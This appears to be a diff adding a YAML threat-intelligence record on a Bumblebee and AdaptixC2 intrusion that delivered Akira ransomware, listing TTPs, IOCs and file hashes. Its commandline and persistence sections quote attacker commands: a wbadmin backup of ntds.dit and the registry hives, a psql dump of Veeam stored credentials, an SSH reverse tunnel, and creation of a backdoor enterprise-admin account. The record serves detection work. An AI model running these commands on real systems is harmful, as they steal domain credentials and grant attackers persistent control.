@@ -1,0 +1,79 @@
+description: Bumblebee malware used in SEO poisoning campaign to deliver Akira ransomware.
+attribution:
+- Unknown
+malware_families:
+- Bumblebee
+- Akira Ransomware
+TTPs:
+  processes:
+  - consent.exe
+  - msimg32.dll
+  - AdaptixC2 beacon (AdgNsy.exe)
+  - systeminfo
+  - nltest /dclist: null
+  - whoami /groups
+  - net group domain admins /dom
+  - wbadmin.exe
+  - rundll32.exe
+  - comsvcs.dll
+  - psql.exe
+  - FileZilla_*_setup.exe
+  - locker.exe
+  commandline:
+  - wbadmin start backup -backuptarget:\\\\127.0.0.1\\C$\\ProgramData\\ -include\":C:\\windows\\NTDS\\ntds.dit,C:\\windows\\system32\\config\\SYSTEM,C:\\windows\\system32\\config\\SECURITY\"
+    -quiet
+  - psql.exe -U postgres --csv -d VeeamBackup -w -c "SELECT user_name,password,description,change_time_utc
+    FROM credentials"
+  powershell:
+  - ''
+  scripting_engine: []
+  registry_keys: []
+  image_load:
+  - consent.exe
+  - msimg32.dll
+  network_connections:
+  - consent.exe -> 109.205.195[.]211:443
+  - consent.exe -> 188.40.187[.]145:443
+  - AdgNsy.exe -> 172.96.137[.]160:443
+  - ssh [email protected] -R *:10400 -p22
+  - FileZilla -> 185.174.100[.]203
+  file_activity:
+  - C:\\Users\\*\\Desktop\\*.msi
+  - C:\\ProgramData\\*.msi
+  - C:\\windows\\NTDS\\ntds.dit
+  - C:\\windows\\system32\\config\\SYSTEM
+  - C:\\windows\\system32\\config\\SECURITY
+  persistence:
+  - net user backup_EA P@ssw0rd1234 /add /dom
+  - net group "enterprise admins" backup_EA /add /dom
+  pipes: []
+  process_relations:
+  - consent.exe -> msimg32.dll
+IOCs:
+  domains:
+  - ev2sirbd269o5j.org
+  - 2rxyt9urhq0bgj.org
+  - opmanager[.]pro
+  - angryipscanner.org
+  - axiscamerastation.org
+  - ip-scanner[.]org
+  IP Addresses:
+  - 109.205.195[.]211
+  - 188.40.187[.]145
+  - 172.96.137[.]160
+  - 170.130.55[.]223
+  - 193.242.184[.]150
+  - 83.229.17[.]60
+  - 185.174.100[.]203
+  file_hashes:
+  - 'ManageEngine-OpManager.msi: 186b26df63df3b7334043b47659cba4185c948629d857d47452cc1936f0aa5da'
+  - 'Advanced-IP-Scanner.msi: a14506c6fb92a5af88a6a44d273edafe10d69ee3d85c8b2a7ac458a22edf68d2'
+  - 'msimg32.dll: a6df0b49a5ef9ffd6513bfe061fb60f6d2941a440038e2de8a7aeb1914945331'
+  - 'msimg32.dll: 6ba5d96e52734cbb9246bcc3decf127f780d48fa11587a1a44880c1f04404d23'
+  - 'locker.exe: de730d969854c3697fd0e0803826b4222f3a14efe47e4c60ed749fff6edce19d'
+  - 'win.exe: 18b8e6762afd29a09becae283083c74a19fc09db1f2c3412c42f1b0178bc122a'
+authors:
+- Cyjax
+reference: https://thedfirreport.com/2025/08/05/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira/
+date_of_publication: August 05, 2025
+file_creation_date: August 12, 2025
